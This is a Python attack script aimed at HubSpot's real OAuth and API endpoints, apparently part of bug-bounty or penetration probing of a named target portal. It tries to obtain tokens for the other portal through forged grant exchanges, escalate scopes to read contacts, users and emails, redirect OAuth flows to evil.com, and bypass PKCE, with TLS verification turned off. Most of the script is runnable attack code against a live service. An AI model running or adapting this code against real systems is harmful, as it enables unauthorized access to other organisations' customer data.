#!/usr/bin/env python3
"""
OAuth/OIDC Vulnerability Testing
Based on: Security Report Sections I-III

Tests OAuth 2.0 and OpenID Connect vulnerabilities including:
- Redirect URI manipulation
- State parameter bypass
- Authorization code interception
- Token endpoint attacks
- Scope manipulation
"""

import requests
import json
import os
import urllib3
import hashlib
import base64
from urllib.parse import urlencode, parse_qs, urlparse
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
CLIENT_SECRET = os.getenv('HUBSPOT_CLIENT_SECRET')
API_KEY = os.getenv('HUBSPOT_API_KEY')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print("OAuth/OIDC Vulnerability Testing")
print("="*80)
print("\nBased on Security Report Sections I-III")
print("Tests: Redirect URI bypass, State bypass, Token attacks, Scope manipulation")
print("="*80)

findings = []

# ============================================================================
# 1. TOKEN INTROSPECTION AND METADATA
# ============================================================================

def test_token_introspection():
    """Test OAuth token introspection endpoints"""
    print("\n[*] Testing token introspection...")

    introspection_urls = [
        'https://api.hubapi.com/oauth/v1/access-tokens',
        'https://api.hubapi.com/oauth/v1/refresh-tokens',
        'https://api.hubapi.com/oauth/v2/access-tokens',
        'https://api.hubapi.com/oauth/v2/refresh-tokens',
    ]

    for base_url in introspection_urls:
        # Try with our token
        try:
            url = f"{base_url}/{ACCESS_TOKEN}"
            r = requests.get(url, verify=False, timeout=10)

            print(f"\n  {url.split('hubapi.com')[1]}")
            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Got token metadata!")
                    print(f"  Data: {json.dumps(data, indent=2)[:300]}")

                    # Check if we can see other portal info
                    if 'hub_id' in data or 'portal_id' in data:
                        print(f"  Portal ID in response: {data.get('hub_id') or data.get('portal_id')}")

                    findings.append({
                        'attack': 'Token Introspection',
                        'url': url,
                        'data': data
                    })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 2. TOKEN EXCHANGE ATTACKS
# ============================================================================

def test_token_exchange():
    """Test if we can exchange tokens or get tokens for other portals"""
    print("\n[*] Testing token exchange...")

    token_endpoint = 'https://api.hubapi.com/oauth/v1/token'

    # Try different grant types
    grant_types = [
        # Try to refresh without refresh token
        {
            'grant_type': 'refresh_token',
            'refresh_token': ACCESS_TOKEN,
            'client_id': TARGET_PORTAL,
            'client_secret': CLIENT_SECRET
        },
        # Try authorization code with our token
        {
            'grant_type': 'authorization_code',
            'code': ACCESS_TOKEN,
            'client_id': TARGET_PORTAL,
            'client_secret': CLIENT_SECRET
        },
        # Try client credentials for target portal
        {
            'grant_type': 'client_credentials',
            'client_id': TARGET_PORTAL,
            'client_secret': CLIENT_SECRET,
            'scope': 'crm.objects.contacts.read'
        },
        # Try with our API key as client secret
        {
            'grant_type': 'client_credentials',
            'client_id': TARGET_PORTAL,
            'client_secret': API_KEY
        },
    ]

    for i, payload in enumerate(grant_types, 1):
        try:
            print(f"\n  Token exchange test {i}: {payload.get('grant_type')}")

            r = requests.post(
                token_endpoint,
                data=payload,
                verify=False,
                timeout=10
            )

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Got new token!")
                    print(f"  Token: {data.get('access_token', '')[:50]}...")

                    # Test if new token works for target portal
                    if 'access_token' in data:
                        test_url = f'https://api.hubapi.com/crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}'
                        test_headers = {'Authorization': f"Bearer {data['access_token']}"}

                        r2 = requests.get(test_url, headers=test_headers, verify=False, timeout=5)
                        print(f"  New token test: {r2.status_code}")

                        if r2.status_code == 200:
                            print(f"  *** NEW TOKEN WORKS FOR TARGET PORTAL ***")
                            findings.append({
                                'attack': 'Token Exchange',
                                'payload': payload,
                                'new_token': data,
                                'test_result': r2.json()
                            })

                except:
                    print(f"  Response: {r.text[:200]}")
            else:
                print(f"  Error: {r.text[:150]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 3. SCOPE MANIPULATION
# ============================================================================

def test_scope_manipulation():
    """Test if we can escalate scopes or access unauthorized scopes"""
    print("\n[*] Testing scope manipulation...")

    headers = {
        'Authorization': f'Bearer {ACCESS_TOKEN}',
        'Content-Type': 'application/json'
    }

    # Try accessing endpoints that require different scopes
    scope_tests = [
        {
            'name': 'GraphQL (requires graphql scope)',
            'url': 'https://api.hubapi.com/graphql',
            'method': 'POST',
            'data': {
                'query': '{ contacts(limit: 10) { results { id firstname } } }',
                'portalId': TARGET_PORTAL
            }
        },
        {
            'name': 'Settings API (requires settings scope)',
            'url': f'https://api.hubapi.com/settings/v3/users?portalId={TARGET_PORTAL}',
            'method': 'GET'
        },
        {
            'name': 'Email API (requires email scope)',
            'url': f'https://api.hubapi.com/marketing/v3/emails?portalId={TARGET_PORTAL}',
            'method': 'GET'
        },
        {
            'name': 'Automation API (requires automation scope)',
            'url': f'https://api.hubapi.com/automation/v4/actions?portalId={TARGET_PORTAL}',
            'method': 'GET'
        },
    ]

    for test in scope_tests:
        try:
            print(f"\n  Testing: {test['name']}")

            if test['method'] == 'GET':
                r = requests.get(test['url'], headers=headers, verify=False, timeout=10)
            else:
                r = requests.post(test['url'], headers=headers, json=test.get('data'), verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  SUCCESS - Accessed endpoint without required scope!")
                try:
                    data = r.json()
                    print(f"  Data: {json.dumps(data, indent=2)[:200]}")

                    findings.append({
                        'attack': 'Scope Escalation',
                        'test': test['name'],
                        'data': data
                    })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 4. AUTHORIZATION ENDPOINT TESTING
# ============================================================================

def test_authorization_endpoint():
    """Test authorization endpoint for parameter manipulation"""
    print("\n[*] Testing authorization endpoint...")

    # Try to initiate OAuth flow with manipulated parameters
    base_url = 'https://app.hubspot.com/oauth/authorize'

    # Redirect URI manipulation tests
    redirect_tests = [
        # Open redirect
        f'{base_url}?client_id={TARGET_PORTAL}&redirect_uri=https://evil.com&scope=crm.objects.contacts.read',
        # Path traversal in redirect
        f'{base_url}?client_id={TARGET_PORTAL}&redirect_uri=https://app.hubspot.com/../../../evil.com&scope=crm.objects.contacts.read',
        # Subdomain takeover
        f'{base_url}?client_id={TARGET_PORTAL}&redirect_uri=https://old-app.hubspot.com&scope=crm.objects.contacts.read',
    ]

    for url in redirect_tests:
        try:
            print(f"\n  Testing redirect: {url[:80]}...")
            r = requests.get(url, verify=False, timeout=10, allow_redirects=False)

            print(f"  Status: {r.status_code}")

            if r.status_code in [200, 302, 303, 307, 308]:
                location = r.headers.get('Location', '')
                print(f"  Location: {location[:100]}")

                # Check if redirect went to our evil domain
                if 'evil.com' in location or 'evil.com' in r.text:
                    print(f"  *** OPEN REDIRECT VULNERABILITY ***")
                    findings.append({
                        'attack': 'Open Redirect',
                        'url': url,
                        'redirect': location
                    })

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 5. PKCE BYPASS TESTING
# ============================================================================

def test_pkce_bypass():
    """Test if PKCE can be bypassed"""
    print("\n[*] Testing PKCE bypass...")

    token_endpoint = 'https://api.hubapi.com/oauth/v1/token'

    # Generate code verifier and challenge
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8').rstrip('=')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode('utf-8')).digest()
    ).decode('utf-8').rstrip('=')

    # Try to get token with PKCE for target portal
    pkce_tests = [
        # With PKCE
        {
            'grant_type': 'authorization_code',
            'client_id': TARGET_PORTAL,
            'code': ACCESS_TOKEN,
            'code_verifier': code_verifier,
            'redirect_uri': 'https://app.hubspot.com/oauth/callback'
        },
        # Without PKCE (should fail if PKCE is enforced)
        {
            'grant_type': 'authorization_code',
            'client_id': TARGET_PORTAL,
            'code': ACCESS_TOKEN,
            'redirect_uri': 'https://app.hubspot.com/oauth/callback'
        },
        # Wrong code verifier
        {
            'grant_type': 'authorization_code',
            'client_id': TARGET_PORTAL,
            'code': ACCESS_TOKEN,
            'code_verifier': 'wrong_verifier',
            'redirect_uri': 'https://app.hubspot.com/oauth/callback'
        },
    ]

    for i, payload in enumerate(pkce_tests, 1):
        try:
            print(f"\n  PKCE test {i}")
            r = requests.post(token_endpoint, data=payload, verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                print(f"  *** PKCE BYPASS SUCCESSFUL ***")
                data = r.json()
                findings.append({
                    'attack': 'PKCE Bypass',
                    'payload': payload,
                    'response': data
                })
            else:
                print(f"  Error: {r.text[:100]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# 6. OAUTH METADATA DISCOVERY
# ============================================================================

def test_oauth_metadata():
    """Try to discover OAuth metadata and configuration"""
    print("\n[*] Testing OAuth metadata discovery...")

    metadata_urls = [
        'https://api.hubapi.com/.well-known/openid-configuration',
        'https://app.hubspot.com/.well-known/openid-configuration',
        'https://api.hubapi.com/.well-known/oauth-authorization-server',
        'https://api.hubapi.com/oauth/.well-known/openid-configuration',
        'https://api.hubapi.com/oauth/v1/.well-known/openid-configuration',
        f'https://api.hubapi.com/oauth/v1/metadata?portalId={TARGET_PORTAL}',
        f'https://api.hubapi.com/oauth/v1/apps/{TARGET_PORTAL}',
    ]

    for url in metadata_urls:
        try:
            print(f"\n  {url.split('hubapi.com')[1] if 'hubapi.com' in url else url.split('hubspot.com')[1]}")
            r = requests.get(url, verify=False, timeout=10)

            print(f"  Status: {r.status_code}")

            if r.status_code == 200:
                try:
                    data = r.json()
                    print(f"  SUCCESS - Found metadata!")
                    print(f"  Keys: {list(data.keys())[:10]}")

                    findings.append({
                        'attack': 'OAuth Metadata Discovery',
                        'url': url,
                        'data': data
                    })
                except:
                    print(f"  Response: {r.text[:200]}")

        except Exception as e:
            print(f"  Error: {str(e)[:80]}")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

test_token_introspection()
test_token_exchange()
test_scope_manipulation()
test_authorization_endpoint()
test_pkce_bypass()
test_oauth_metadata()

print("\n" + "="*80)
print(f"OAuth/OIDC Testing Complete")
print(f"Findings: {len(findings)}")
print("="*80)

if findings:
    print("\n*** POTENTIAL OAuth/OIDC VULNERABILITIES ***\n")

    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   {json.dumps(finding, indent=3)[:400]}...")
        print()

    with open('/home/user/Hub/findings/oauth_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved to: findings/oauth_findings.json")
else:
    print("\nNo OAuth/OIDC vulnerabilities found.")
    print("\nThis means:")
    print("  - Token endpoints properly validate credentials")
    print("  - Redirect URIs are validated")
    print("  - Scopes are properly enforced")
    print("  - PKCE is implemented correctly")
    print("  - No token exchange vulnerabilities")
